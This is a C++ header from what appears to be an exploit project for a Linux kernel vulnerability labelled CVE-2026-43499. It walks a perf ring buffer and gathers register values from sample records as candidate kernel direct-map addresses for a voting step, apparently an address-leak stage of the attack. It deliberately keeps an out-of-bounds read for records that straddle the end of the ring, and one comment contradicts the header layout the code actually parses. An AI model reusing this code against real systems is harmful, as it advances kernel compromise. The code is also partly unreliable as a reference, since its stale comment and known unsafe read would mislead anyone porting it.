#pragma once
/** @file backend/cve_2026_43499/perf_ring.hpp
 *  Walking a perf ring: which records to read, and where each one starts.
 *
 *  The kernel writes records into a ring and the reader walks from where it last stopped
 *  to where the kernel says it has written, wrapping by modulo the data size. Three details
 *  are the whole rule, and all three are places a rewrite can differ without looking wrong.
 *  A record of size zero ends the walk rather than being skipped: it means the writer
 *  reached a point the reader cannot use yet, and stepping over it would read whatever
 *  happens to follow. Only sample records are read, and only those whose ABI tag is one of
 *  the two the kernel uses for a full register set. And the tail is moved to where the reader
 *  got to, not to where it started, so the next walk continues instead of repeating.
 *
 *  The sample values themselves are handed to the voting rule next door; this file decides
 *  which bytes are records and which registers are worth collecting.
 *
 *  ONE HAZARD, KEPT AND NAMED (the retired reader had it too): a record that straddles the end
 *  of the ring is read in two pieces from the same address arithmetic, so a record is assumed
 *  to fit between where it starts and the end of the buffer. The kernel writes whole records
 *  and the ring is page-aligned, so in practice it does; a rewrite that wanted to be safe
 *  against a straddling record would have to copy it first, and that decision belongs to
 *  whoever ports the reading with a real ring in front of it.
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43499/perf_vote.hpp"

namespace ghostlock::backend::cve_2026_43499 {
    /** The record type the kernel writes for a sample: mechanism, from the perf ABI. */
    inline constexpr std::uint32_t kPerfRecordSample = 9U;
    /** The record header: a 32-bit type, a 16-bit misc, then a 16-bit size. The size is the
     *  narrow field at offset six, which a reader that took it as a second 32-bit word would
     *  read half of the misc and half of itself -- found on a device, where the harness could
     *  not find it because the harness wrote the same wrong header. */
    inline constexpr std::size_t kPerfRecordHeader = 8U;
    inline constexpr std::size_t kPerfRecordSizeOffset = 6U;
    /** The instruction pointer that follows the header, which the reader steps over.
     *
     *  THIS READER ASSUMES THE SAMPLE TYPE INCLUDES THE IP. A device run showed why that
     *  matters: with only the register sample requested, a sample is a header and one ABI word
     *  and nothing else, and a reader that steps over an IP that is not there reads the wrong
     *  eight bytes and finds no registers in a record full of them. The retired path asked for
     *  the IP and so does this one; a caller that changes the sample type has to change this
     *  step with it. */
    inline constexpr std::size_t kPerfSampleIp = 8U;
    /** How far past the instruction pointer the ABI word sits. Mechanism, from the same ABI. */
    inline constexpr std::size_t kPerfSampleAbi = 8U;
    /** The two ABI tags the kernel uses for a sample that carries registers. */
    inline constexpr std::uint64_t kPerfAbiOne = 1U;
    inline constexpr std::uint64_t kPerfAbiTwo = 2U;

    /** The ring as the reader sees it: the buffer, its data size, and where the two ends are. */
    struct RingView final {
        const unsigned char *buffer = nullptr;
        std::size_t data_size = 0U;
        std::uint64_t tail = 0U;
        std::uint64_t head = 0U;
    };

    /** What a walk did. */
    struct RingOutcome final {
        std::size_t kept = 0U;
        /** Where the reader stopped, which is what the tail becomes. */
        std::uint64_t position = 0U;
        std::size_t samples = 0U;
        /** True when a record of size zero ended the walk early. */
        bool stopped_early = false;
    };

    /** Walk the ring from the tail to the head, collecting candidate registers from the
     *  sample records that carry them. The tail does not move here: the caller owns it, and
     *  moving it is the one thing a walk must not do twice. */
    [[nodiscard]] constexpr RingOutcome walk_perf_ring(const RingView &ring, const DirectMapBounds &bounds,
                                                      std::uint64_t *out, std::size_t out_capacity) noexcept {
        RingOutcome outcome{};
        outcome.position = ring.tail;
        if (ring.buffer == nullptr || ring.data_size == 0U || out == nullptr || out_capacity == 0U) {
            return outcome;
        }
        std::uint64_t pos = ring.tail;
        while (pos < ring.head && outcome.kept < out_capacity) {
            const std::size_t at = static_cast<std::size_t>(pos % ring.data_size);
            /* A record header is two 32-bit words: the type, then the size. */
            std::uint32_t type = 0U;
            for (std::size_t i = 0U; i < 4U; ++i) {
                type |= static_cast<std::uint32_t>(ring.buffer[at + i]) << (8U * i);
            }
            const std::uint32_t size =
                static_cast<std::uint32_t>(ring.buffer[at + kPerfRecordSizeOffset]) |
                (static_cast<std::uint32_t>(ring.buffer[at + kPerfRecordSizeOffset + 1U]) << 8U);
            if (size == 0U) {
                outcome.stopped_early = true;
                break;
            }
            if (type == kPerfRecordSample) {
                const std::size_t body = at + kPerfRecordHeader + kPerfSampleIp;
                /* The first word after the instruction pointer is the ABI tag. */
                std::uint64_t abi = 0U;
                for (std::size_t i = 0U; i < 8U; ++i) {
                    abi |= static_cast<std::uint64_t>(ring.buffer[body + i]) << (8U * i);
                }
                if (abi == kPerfAbiOne || abi == kPerfAbiTwo) {
                    /* The registers follow the ABI word. They are read as host words, which
                     *  is what the kernel wrote: this reader and the writer share a machine. */
                    const std::uint64_t *registers =
                        reinterpret_cast<const std::uint64_t *>(ring.buffer + body + 8U);
                    outcome.kept += collect_candidates(registers, kSampleRegisterVotes, bounds,
                                                       out + outcome.kept, out_capacity - outcome.kept);
                    ++outcome.samples;
                }
            }
            pos += size;
        }
        outcome.position = pos;
        return outcome;
    }
}  // namespace ghostlock::backend::cve_2026_43499
